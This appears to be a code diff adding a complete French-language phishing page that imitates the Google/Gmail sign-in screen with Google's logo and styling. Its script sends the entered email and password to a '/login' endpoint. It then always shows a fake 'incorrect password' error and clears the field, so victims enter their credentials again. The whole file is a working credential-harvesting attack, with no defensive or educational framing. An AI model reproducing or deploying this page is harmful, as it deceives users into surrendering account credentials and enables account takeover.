@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            padding: 16px;
+            text-align: center;
+        }
+        
+        .header img {
+            height: 40px;
+            margin-top: 16px;
+        }
+        
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 450px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            padding: 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 16px;
+            color: #202124;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 13px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26,115,232,0.1);
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-top: 8px;
+        }
+        
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .btn-container {
+            margin-top: 30px;
+            display: flex;
+            justify-content: flex-end;
+        }
+        
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #1765cc;
+        }
+        
+        .create-account {
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .footer {
+            padding: 16px;
+            text-align: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #70757a;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </header>
+    
+    <main class="main-content">
+        <div class="card">
+            <h1>Connexion</h1>
+            <p>Utilisez votre compte Gmail</p>
+            
+            <form id="login-form" action="/login" method="POST">
+                <div class="form-group">
+                    <label for="email">Adresse e-mail</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Mot de passe</label>
+                    <input type="password" id="password" name="password" required>
+                    <div class="error-message" id="error-message">Mot de passe incorrect. Veuillez réessayer.</div>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+                
+                <div class="btn-container">
+                    <button type="submit" class="btn">Suivant</button>
+                </div>
+            </form>
+            
+            <div class="create-account">
+                <p>Vous n'avez pas de compte ? <a href="#">Créer un compte</a></p>
+            </div>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <select>
+            <option>Français</option>
+            <option>English</option>
+        </select>
+        <div>
+            <a href="#">Aide</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Conditions</a>
+        </div>
+    </footer>
+    
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Envoyer les données au serveur
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Afficher un message d'erreur pour que l'utilisateur ressaisisse ses informations
+                document.getElementById('error-message').style.display = 'block';
+                
+                // Effacer le champ du mot de passe
+                document.getElementById('password').value = '';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Afficher un message d'erreur
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('password').value = '';
+            });
+        });
+    </script>
+</body>
+</html>
